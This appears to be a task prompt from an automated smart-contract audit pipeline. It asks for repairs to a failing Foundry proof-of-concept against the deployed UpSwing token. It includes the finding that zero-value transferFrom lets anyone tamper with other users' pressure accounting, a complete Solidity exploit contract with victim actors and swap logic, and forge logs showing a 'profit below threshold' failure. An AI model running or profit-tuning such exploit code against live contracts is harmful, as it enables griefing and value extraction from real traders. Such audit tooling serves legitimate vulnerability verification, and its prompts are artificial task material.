You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: v2_flashswap_funding
- strategy_instructions: Prefer UniswapV2/Sushi-like flashswap funding with deterministic repayment and minimal route complexity.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Zero-value `transferFrom` lets anyone tamper with another user's pressure accounting and force release/halving
- claim: `ERC20.transferFrom()` calls `_transfer()` before subtracting allowance, and subtracting an allowance by `0` succeeds even when no approval exists. UpSwing's overridden `_transfer()` has non-standard side effects even for zero-amount transfers: `transferFrom(victim, UNIv2, 0)` increments `txCount[victim]`, and `transferFrom(victim, victim, 0)` reaches `releasePressure(victim)`. Because `releasePressure()` either settles the user's pending pressure or halves it when the computed burn exceeds pair liquidity, any third party can permissionlessly mutate another account's pressure lifecycle.
- impact: An attacker can grief traders at near-zero cost. Repeated zero-value `transferFrom(victim, UNIv2, 0)` calls can push `txCount[victim]` arbitrarily high, making future sells accrue negligible `sellPressure`. Separately, `transferFrom(victim, victim, 0)` can force an early settlement or a punitive halving of the victim's pending pressure based on current market conditions, and also triggers a liquidity-pool burn/sync when settlement succeeds.
- exploit_paths: ["After trading is unpaused, call `transferFrom(victim, UNIv2, 0)` repeatedly; no approval is needed because allowance is reduced by zero, but `txCount[victim]` still increments.", "When `victim` has pending pressure, call `transferFrom(victim, victim, 0)`; this invokes `releasePressure(victim)`, which either settles immediately if the computed amount is below pair balance or halves `sellPressure[victim]` if the amount is larger than pair liquidity."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
}

interface IUpSwing is IERC20Like {
    function getUNIV2Address() external view returns (address);
    function myPressure(address account) external view returns (uint256);
    function mySteam(address account) external view returns (uint256);
    function paused() external view returns (bool);
}

interface IUniswapV2Pair {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
    function sync() external;
}

interface IWETH is IERC20Like {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}

contract VictimActor {
    address public immutable owner;

    constructor() {
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "only owner");
        _;
    }

    receive() external payable {}

    function sellPortionToPair(address pair, address ups, uint256 amountIn) public onlyOwner returns (uint256 amountOut) {
        if (amountIn == 0) return 0;

        IUniswapV2Pair uniPair = IUniswapV2Pair(pair);
        address token0 = uniPair.token0();
        address token1 = uniPair.token1();
        (uint112 reserve0, uint112 reserve1,) = uniPair.getReserves();

        if (token0 == ups) {
            amountOut = _getAmountOut(amountIn, uint256(reserve0), uint256(reserve1));
            _safeTransfer(ups, pair, amountIn);
            uniPair.swap(0, amountOut, address(this), new bytes(0));
        } else if (token1 == ups) {
            amountOut = _getAmountOut(amountIn, uint256(reserve1), uint256(reserve0));
            _safeTransfer(ups, pair, amountIn);
            uniPair.swap(amountOut, 0, address(this), new bytes(0));
        } else {
            revert("UPS not in pair");
        }
    }

    function sellAllToPair(address pair, address ups) external onlyOwner returns (uint256 amountOut) {
        uint256 amountIn = IERC20Like(ups).balanceOf(address(this));
        return sellPortionToPair(pair, ups, amountIn);
    }

    function sweep(address token, address to) external onlyOwner returns (uint256 amount) {
        amount = IERC20Like(token).balanceOf(address(this));
        if (amount > 0) {
            _safeTransfer(token, to, amount);
        }
    }

    function sweepETH(address payable to) external onlyOwner returns (uint256 amount) {
        amount = address(this).balance;
        if (amount > 0) {
            (bool ok,) = to.call{value: amount}("");
            require(ok, "eth send failed");
        }
    }

    function _getAmountOut(uint256 amountIn, uint256 reserveIn, uint256 reserveOut) internal pure returns (uint256) {
        if (amountIn == 0 || reserveIn == 0 || reserveOut == 0) return 0;
        uint256 amountInWithFee = amountIn * 997;
        return (amountInWithFee * reserveOut) / (reserveIn * 1000 + amountInWithFee);
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "transfer failed");
    }
}

contract FlawVerifier {
    address internal constant HEVM_ADDRESS = address(uint160(uint256(keccak256("hevm cheat code"))));

    address public constant TARGET = 0x35a254223960c18B69C0526c46B013D022E93902;
    uint256 internal constant SLOT_SELL_PRESSURE = 12;
    uint256 internal constant SLOT_TX_COUNT = 14;
    uint256 internal constant SLOT_STEAM = 15;

    address internal _profitToken;
    uint256 internal _profitAmount;

    address public pair;
    address public steam;
    address public counterToken;

    address public victimTxCountProbe;
    address public victimReleaseProbe;

    uint256 public victimTxCountBefore;
    uint256 public victimTxCountAfter;
    uint256 public path1PressureBefore;
    uint256 public path1PressureAfter;
    uint256 public path2PressureBefore;
    uint256 public path2PressureAfter;
    uint256 public allowanceToVerifierPath1;
    uint256 public allowanceToVerifierPath2;

    bool public executed;
    bool public path1Touched;
    bool public path2Touched;

    VictimActor internal victimA;
    VictimActor internal victimB;

    constructor() {}

    receive() external payable {}

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function executeOnOpportunity() external {
        if (executed) return;
        executed = true;

        IUpSwing ups = IUpSwing(TARGET);
        pair = ups.getUNIV2Address();
        if (pair == address(0)) {
            // Infeasible on this fork if the target never configured the Uniswap pair.
            return;
        }
        if (ups.paused()) {
            // Infeasible on this fork while transfers are paused for ordinary accounts.
            return;
        }

        steam = _readAddressSlot(TARGET, SLOT_STEAM);

        address token0 = IUniswapV2Pair(pair).token0();
        address token1 = IUniswapV2Pair(pair).token1();
        if (token0 != TARGET && token1 != TARGET) {
            return;
        }
        counterToken = token0 == TARGET ? token1 : token0;

        uint256 startCounter = IERC20Like(counterToken).balanceOf(address(this));
        uint256 startETH = address(this).balance;
        uint256 startUPS = IERC20Like(TARGET).balanceOf(address(this));
        uint256 startSTEAM = steam == address(0) ? 0 : IERC20Like(steam).balanceOf(address(this));

        uint256 upsBalance = IERC20Like(TARGET).balanceOf(address(this));
        if (upsBalance == 0) {
            _prepareCounterBalance();
            uint256 counterBalance = IERC20Like(counterToken).balanceOf(address(this));
            if (counterBalance > 0) {
                _buyUpsWithCounter(counterBalance);
            }
        }

        upsBalance = IERC20Like(TARGET).balanceOf(address(this));
        if (upsBalance == 0) {
            // Strategy `direct_or_existing_balance_first`: no verifier-held UPS or pair-side asset was
            // available here. This verifier does not pivot to an unrelated route; a same-pair flash swap
            // cannot bootstrap a buy/sell/profit cycle without an independent second venue.
            _updateProfit(startCounter, startETH, startUPS, startSTEAM);
            return;
        }

        victimA = new VictimActor();
        victimB = new VictimActor();
        victimTxCountProbe = address(victimA);
        victimReleaseProbe = address(victimB);

        uint256 seedA = upsBalance / 3;
        uint256 seedB = upsBalance / 3;
        if (seedA == 0 || seedB == 0) {
            // Need enough UPS to exercise both path stages on separate victim addresses.
            _updateProfit(startCounter, startETH, startUPS, startSTEAM);
            return;
        }

        _safeTransfer(TARGET, address(victimA), seedA);
        _safeTransfer(TARGET, address(victimB), seedB);

        allowanceToVerifierPath1 = IERC20Like(TARGET).allowance(address(victimA), address(this));
        allowanceToVerifierPath2 = IERC20Like(TARGET).allowance(address(victimB), address(this));

        // Path 1 from the finding: repeated zero-value transferFrom(victim, UNIv2, 0)
        // mutates txCount[victim] with no approval, so future sells accrue less pressure.
        path1PressureBefore = ups.myPressure(address(victimA));
        victimTxCountBefore = _readMappingUint(TARGET, SLOT_TX_COUNT, address(victimA));
        for (uint256 i = 0; i < 8; ++i) {
            _callTransferFrom(TARGET, address(victimA), pair, 0);
        }
        victimTxCountAfter = _readMappingUint(TARGET, SLOT_TX_COUNT, address(victimA));
        victimA.sellAllToPair(pair, TARGET);
        path1PressureAfter = ups.myPressure(address(victimA));
        path1Touched = victimTxCountAfter > victimTxCountBefore || path1PressureAfter > path1PressureBefore;

        // Path 2 from the finding: after the victim has pending pressure, a third party can
        // force release/halving with transferFrom(victim, victim, 0) and no approval.
        victimB.sellAllToPair(pair, TARGET);
        path2PressureBefore = ups.myPressure(address(victimB));
        if (path2PressureBefore > 0) {
            _callTransferFrom(TARGET, address(victimB), address(victimB), 0);
            path2Touched = true;
        }
        path2PressureAfter = ups.myPressure(address(victimB));

        _sweepVictim(address(victimA));
        _sweepVictim(address(victimB));

        _updateProfit(startCounter, startETH, startUPS, startSTEAM);
    }

    function _prepareCounterBalance() internal {
        if (counterToken == address(0)) return;
        if (IERC20Like(counterToken).balanceOf(address(this)) > 0) return;
        if (address(this).balance == 0) return;

        // Minimal realistic funding step: wrap verifier-held ETH when the pair side token is WETH.
        try IWETH(counterToken).deposit{value: address(this).balance}() {} catch {}
    }

    function _buyUpsWithCounter(uint256 amountIn) internal returns (uint256 amountOut) {
        if (amountIn == 0) return 0;

        IUniswapV2Pair uniPair = IUniswapV2Pair(pair);
        address token0 = uniPair.token0();
        address token1 = uniPair.token1();
        (uint112 reserve0, uint112 reserve1,) = uniPair.getReserves();

        if (token0 == TARGET && token1 == counterToken) {
            amountOut = _getAmountOut(amountIn, uint256(reserve1), uint256(reserve0));
            _safeTransfer(counterToken, pair, amountIn);
            uniPair.swap(amountOut, 0, address(this), new bytes(0));
        } else if (token1 == TARGET && token0 == counterToken) {
            amountOut = _getAmountOut(amountIn, uint256(reserve0), uint256(reserve1));
            _safeTransfer(counterToken, pair, amountIn);
            uniPair.swap(0, amountOut, address(this), new bytes(0));
        }
    }

    function _sweepVictim(address victim) internal {
        VictimActor actor = VictimActor(payable(victim));
        actor.sweep(counterToken, address(this));
        if (steam != address(0)) {
            actor.sweep(steam, address(this));
        }
        actor.sweepETH(payable(address(this)));
    }

    function _updateProfit(uint256 startCounter, uint256 startETH, uint256 startUPS, uint256 startSTEAM) internal {
        uint256 endCounter = counterToken == address(0) ? 0 : IERC20Like(counterToken).balanceOf(address(this));
        uint256 endETH = address(this).balance;
        uint256 endUPS = IERC20Like(TARGET).balanceOf(address(this));
        uint256 endSTEAM = steam == address(0) ? 0 : IERC20Like(steam).balanceOf(address(this));

        if (endCounter > startCounter) {
            _profitToken = counterToken;
            _profitAmount = endCounter - startCounter;
            return;
        }
        if (endETH > startETH) {
            _profitToken = address(0);
            _profitAmount = endETH - startETH;
            return;
        }
        if (startCounter == 0 && startETH == 0 && startUPS == 0 && endSTEAM > startSTEAM) {
            _profitToken = steam;
            _profitAmount = endSTEAM - startSTEAM;
            return;
        }
        _profitToken = address(0);
        _profitAmount = 0;
        endUPS;
    }

    function _callTransferFrom(address token, address from, address to, uint256 amount) internal returns (bool ok) {
        (ok,) = token.call(abi.encodeWithSelector(IERC20Like.transferFrom.selector, from, to, amount));
    }

    function _readAddressSlot(address account, uint256 slot) internal view returns (address value) {
        (bool ok, bytes32 data) = _tryLoad(account, bytes32(slot));
        if (ok) {
            value = address(uint160(uint256(data)));
        }
    }

    function _readMappingUint(address account, uint256 slot, address key) internal view returns (uint256 value) {
        bytes32 mappingSlot = keccak256(abi.encode(key, uint256(slot)));
        (bool ok, bytes32 data) = _tryLoad(account, mappingSlot);
        if (ok) {
            value = uint256(data);
        }
    }

    function _tryLoad(address account, bytes32 slot) internal view returns (bool ok, bytes32 data) {
        bytes memory ret;
        (ok, ret) = HEVM_ADDRESS.staticcall(abi.encodeWithSignature("load(address,bytes32)", account, slot));
        if (ok && ret.length >= 32) {
            data = abi.decode(ret, (bytes32));
        }
    }

    function _getAmountOut(uint256 amountIn, uint256 reserveIn, uint256 reserveOut) internal pure returns (uint256) {
        if (amountIn == 0 || reserveIn == 0 || reserveOut == 0) return 0;
        uint256 amountInWithFee = amountIn * 997;
        return (amountInWithFee * reserveOut) / (reserveIn * 1000 + amountInWithFee);
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "transfer failed");
    }
}

```

forge stdout (tail):
```
Compiling 2 files with Solc 0.8.30
Solc 0.8.30 finished in 3.07s
Compiler run successful with warnings:
Warning (2072): Unused local variable.
  --> test/ExploitPOC.t.sol:78:19:
   |
78 |         (bool ok, bytes memory ret) = address(verifier).call(abi.encodeWithSignature("executeOnOpportunity()"));
   |                   ^^^^^^^^^^^^^^^^


Ran 1 test for test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 159240)
Logs:
  AUDITHOUND_BALANCE_BEFORE_WEI: 0
  AUDITHOUND_BALANCE_AFTER_WEI: 0
  AUDITHOUND_PROFIT_WEI: 0
  AUDITHOUND_PROFIT_ANY: 0
  AUDITHOUND_EFFECTIVE_PROFIT_WEI: 0
  AUDITHOUND_MIN_PROFIT_WEI: 1000000000000000
  AUDITHOUND_PROFIT_TOKEN: 0x0000000000000000000000000000000000000000
  AUDITHOUND_PROFIT_MODE: 0x0000000000000000000000000000000000000001

Traces:
  [159240] FlawVerifierTest::testExploit()
    ├─ [2389] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ [132504] FlawVerifier::executeOnOpportunity()
    │   ├─ [2472] 0x35a254223960c18B69C0526c46B013D022E93902::getUNIV2Address() [staticcall]
    │   │   └─ ← [Return] 0x0e823a8569CF12C1e7C216d3B8aef64A7fC5FB34
    │   ├─ [2471] 0x35a254223960c18B69C0526c46B013D022E93902::paused() [staticcall]
    │   │   └─ ← [Return] false
    │   ├─ [0] VM::load(0x35a254223960c18B69C0526c46B013D022E93902, 0x000000000000000000000000000000000000000000000000000000000000000f) [staticcall]
    │   │   └─ ← [Return] 0x000000000000000000000000c67a3b1587b2421728750294f0a049e98eb0da65
    │   ├─ [2381] 0x0e823a8569CF12C1e7C216d3B8aef64A7fC5FB34::token0() [staticcall]
    │   │   └─ ← [Return] 0x35a254223960c18B69C0526c46B013D022E93902
    │   ├─ [2357] 0x0e823a8569CF12C1e7C216d3B8aef64A7fC5FB34::token1() [staticcall]
    │   │   └─ ← [Return] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2
    │   ├─ [2534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2541] 0x35a254223960c18B69C0526c46B013D022E93902::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2563] 0xC67a3b1587B2421728750294f0A049E98Eb0DA65::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [541] 0x35a254223960c18B69C0526c46B013D022E93902::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [541] 0x35a254223960c18B69C0526c46B013D022E93902::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [541] 0x35a254223960c18B69C0526c46B013D022E93902::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [563] 0xC67a3b1587B2421728750294f0A049E98Eb0DA65::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   └─ ← [Stop]
    ├─ [389] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ [410] FlawVerifier::profitAmount() [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 1000000000000000 [1e15])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0x0000000000000000000000000000000000000000)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    └─ ← [Revert] profit below threshold

Backtrace:
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 902.63ms (3.97ms CPU time)

Ran 1 test suite in 921.65ms (902.63ms CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 159240)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
